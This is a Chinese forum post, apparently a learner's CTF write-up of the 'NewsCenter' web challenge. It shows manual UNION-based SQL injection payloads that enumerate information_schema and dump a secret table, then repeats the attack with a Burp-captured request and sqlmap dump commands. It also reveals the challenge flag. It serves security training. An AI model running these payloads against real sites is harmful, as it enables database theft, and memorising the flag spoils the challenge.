
# [CTF] 学破解第190天，《攻防世界web练习区NewsCenter》学习

- 原帖：https://www.52pojie.cn/forum.php?mod=viewthread&tid=1619030
- 抓取时间：2026-11-01T23:30:28

## 前言

坛友们，年轻就是资本，和我一起逆天改命吧，我的学习过程全部记录及学习资源：[https://www.52pojie.cn/thread-1582287-1-1.html](https://www.52pojie.cn/thread-1582287-1-1.html)

立帖为证！--------记录学习的点点滴滴

## 0x1 手动查找

1. 打开网页观察页面：

![]((https://s1.ax1x.com/2022/04/09/LPluIU.png)

2. 看到是一个搜索框，输入单引号，可以看到单引号报错，双引号正常显示，猜测存在注入点

![]((https://s1.ax1x.com/2022/04/09/LP1eld.png)

3. 在输入以下内容进行测试，发现页面正常，说明存在注入点：

```text
1' #
1%27 %23
//有时候#会认为锚点，导致注入失败，需要转义
```

| 字符 | 来自 Windows-1252 | 来自 UTF-8 |
| --- | --- | --- |
| space | %20 | %20 |
| ! | %21 | %21 |
| " | %22 | %22 |
| # | %23 | %23 |
| $ | %24 | %24 |
| % | %25 | %25 |
| & | %26 | %26 |
| ' | %27 | %27 |
| ( | %28 | %28 |
| ) | %29 | %29 |
| * | %2A | %2A |
| + | %2B | %2B |
| , | %2C | %2C |
| - | %2D | %2D |
| . | %2E | %2E |
| / | %2F | %2F |

4. 判断列，通过 `order by` 判断表存在3列。

```sql
1' order by 1#
1' order by 2#
1' order by 3#
1' order by 4#  //报错
```

5. 输入 `-1` 让前半句失效，再执行后半句进行回显。

```sql
-1' union select 1,2,3#
```

![]((https://s1.ax1x.com/2022/04/09/LP31D1.png)

6. 可以看到回显是在第2列和第3列，一会就得利用这两个地方获取我需要的信息，

```sql
-1' union select 1,2,3#
```

7. 利用两个回显的地方，查询我们要的信息。

```sql
-1' union select 1,database(),user()#  //查看当前数据库和用户名
-1' union select 1,2,group_concat(schema_name) from information_schema.schemata#  //查看所有数据库
```

![]((https://s1.ax1x.com/2022/04/09/LPtDtx.png)

8. 查看 `news` 数据库下的所有表：

```sql
-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='news'#
```

![]((https://s1.ax1x.com/2022/04/09/LP073q.png)

9. 再来查表中的所有列：

```sql
-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='news'#
-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='secret_table'#
```

输出：

```text
id,title,content
```

输出：

```text
id,fl4g
```

10. 查表中的所有行，成功得到 flag：`QCTF{sq1_inJec7ion_ezzz}`

```sql
-1' union select 1,2,group_concat(concat_ws('||',id,fl4g)) from news.secret_table#  //concat_ws是用来以双竖线分割
```

![]((https://s1.ax1x.com/2022/04/09/LPDUTe.png)

## 0x2 自动查找

1. 打开 `kali` 系统，打开 `burp` 工具，设置浏览器代{过}{滤}理，打开拦截，搜索框输入 `123`，回车成功拦截到数据包：

```http
POST / HTTP/1.1
Host: 111.200.241.244:59722
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Origin: http://111.200.241.244:59722
DNT: 1
Connection: close
Referer: http://111.200.241.244:59722/
Upgrade-Insecure-Requests: 1

search=123
```

2. 直接右键，`copy to file`，保存一下，命名为 `bom`。

![]((https://s1.ax1x.com/2022/04/09/LPsFK0.png)

3. 再来到终端使用 `sqlmap` 工具，输入 `sqlmap -r bom --dbs --batch`，读本地文件爆破数据库名：

```text
Parameter: search (POST)

    Type: UNION query

    Title: Generic UNION query (NULL) - 3 columns

    Payload: search=123' UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qxpzq','JhGHiWBoDycinhxQpRZJZyItevTMJhbAKwrLyCUb'),'qzvbq')-- ztDs

---

[01:24:20] [INFO] testing MySQL

[01:24:21] [INFO] confirming MySQL

[01:24:28] [INFO] the back-end DBMS is MySQL

web server operating system: Linux Debian 9 (stretch)

web application technology: Apache 2.4.25

back-end DBMS: MySQL >= 5.0.0

[01:24:29] [INFO] fetching database names

available databases [2]:

-  information_schema

-  news
```

4. 输入 `sqlmap -r bom -D news --tables --batch`，爆 `news` 数据库对应的所有表：

```text
Database: news
[2 tables]
+--------------+
| news         |
| secret_table |
+--------------+
```

5. 输入 `sqlmap -r bom -T secret_table --columns --batch` 爆 `secret_table` 表的所有字段（列）

```text
Database: news

Table: secret_table

[2 columns]

+--------+------------------+

| Column | Type             |

+--------+------------------+

| fl4g   | varchar(50)      |

| id     | int(10) unsigned |

+--------+------------------+
```

6. 输入 `sqlmap -r bom -T secret_table --dump --batch`，爆 `secret_table` 表的所有数据（行）

```text
Database: news
Table: secret_table
[1 entry]
+----+--------------------------+
| id | fl4g                     |
+----+--------------------------+
| 1  | QCTF{sq1_inJec7ion_ezzz} |
+----+--------------------------+
```

7. 可以看到成功得到 flag：`QCTF{sq1_inJec7ion_ezzz}`。

## 0x3 总结

1. 比较简单的 `sql` 注入题目，适合菜鸟练手。
